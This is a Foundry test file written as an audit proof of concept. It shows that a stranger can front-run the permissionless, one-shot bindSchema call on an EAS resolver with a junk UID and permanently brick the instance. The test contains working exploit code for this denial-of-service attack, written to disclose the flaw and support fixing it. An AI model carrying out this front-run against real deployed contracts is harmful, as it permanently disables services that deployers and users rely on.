// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// AUDIT POC (disposable) — zk-soundness pass, 2026-08-22.
// Demonstrates that `EASIndexerResolver.bindSchema` is permissionless and one-shot, so on any
// deploy path where the resolver is deployed in one transaction and bound in a later one
// (contracts/script/DeployNetwork.s.sol, contracts/script/DeployEasResolver.s.sol), a stranger
// can bind a junk UID first and permanently brick the instance: every real attestation then
// reverts `ForeignSchema` and `boundSchema` can never be changed.

import {Test} from "forge-std/Test.sol";

import {EAS} from "@ethereum-attestation-service/eas-contracts/contracts/EAS.sol";
import {SchemaRegistry} from "@ethereum-attestation-service/eas-contracts/contracts/SchemaRegistry.sol";
import {
    IEAS,
    AttestationRequest,
    AttestationRequestData
} from "@ethereum-attestation-service/eas-contracts/contracts/IEAS.sol";
import {ISchemaRegistry} from "@ethereum-attestation-service/eas-contracts/contracts/ISchemaRegistry.sol";
import {EMPTY_UID, NO_EXPIRATION_TIME} from "@ethereum-attestation-service/eas-contracts/contracts/Common.sol";

import {EASIndexerResolver} from "src/eas/resolvers/EASIndexerResolver.sol";

contract AuditBindSchemaFrontRunTest is Test {
    SchemaRegistry internal registry;
    EAS internal eas;
    EASIndexerResolver internal resolver;

    address internal deployer = address(0xD3910);
    address internal attacker = address(0xBAD);
    address internal alice = address(0xA11CE);

    function setUp() public {
        registry = new SchemaRegistry();
        eas = new EAS(ISchemaRegistry(address(registry)));
        // Transaction 1 of the scripted deploy: the resolver lands, unbound.
        vm.prank(deployer);
        resolver = new EASIndexerResolver(IEAS(address(eas)));
    }

    function _attest(bytes32 schemaUid) internal {
        vm.prank(alice);
        eas.attest(
            AttestationRequest({
                schema: schemaUid,
                data: AttestationRequestData({
                    recipient: address(0xB0B),
                    expirationTime: NO_EXPIRATION_TIME,
                    revocable: true,
                    refUID: EMPTY_UID,
                    data: abi.encode("ok", uint256(95)),
                    value: 0
                })
            })
        );
    }

    /// Baseline: the intended sequence works and the accumulator folds the edge.
    function test_happyPath_foldsEdge() public {
        bytes32 schemaUid = registry.register("string comment,uint256 confidence", resolver, true);
        vm.prank(deployer);
        resolver.bindSchema(schemaUid);

        _attest(schemaUid);
        assertEq(resolver.leafCount(), 1, "edge folded");
    }

    /// The attack: any stranger front-runs `bindSchema` with a junk UID between the resolver
    /// deployment and the deployer's own bind. The instance is then permanently unusable.
    function test_strangerBindsJunkUid_bricksInstanceForever() public {
        // Transaction 2, front-run by anyone. Costs one tx, needs no role and no prior state.
        vm.prank(attacker);
        resolver.bindSchema(bytes32(uint256(0xdead)));
        assertEq(resolver.boundSchema(), bytes32(uint256(0xdead)));

        // The deployer's real schema registration still succeeds (EAS does not consult the
        // resolver at registration time) ...
        bytes32 schemaUid = registry.register("string comment,uint256 confidence", resolver, true);

        // ... but the deployer can never bind it: one-shot, no owner, no reset.
        vm.prank(deployer);
        vm.expectRevert(EASIndexerResolver.SchemaAlreadyBound.selector);
        resolver.bindSchema(schemaUid);

        // And every real attestation now reverts inside the resolver, so no edge can EVER be
        // folded into this instance's accumulator: the graph is permanently empty.
        vm.prank(alice);
        vm.expectRevert(
            abi.encodeWithSelector(EASIndexerResolver.ForeignSchema.selector, schemaUid, bytes32(uint256(0xdead)))
        );
        eas.attest(
            AttestationRequest({
                schema: schemaUid,
                data: AttestationRequestData({
                    recipient: address(0xB0B),
                    expirationTime: NO_EXPIRATION_TIME,
                    revocable: true,
                    refUID: EMPTY_UID,
                    data: abi.encode("ok", uint256(95)),
                    value: 0
                })
            })
        );
        assertEq(resolver.leafCount(), 0, "no edge can ever be folded");
    }
}
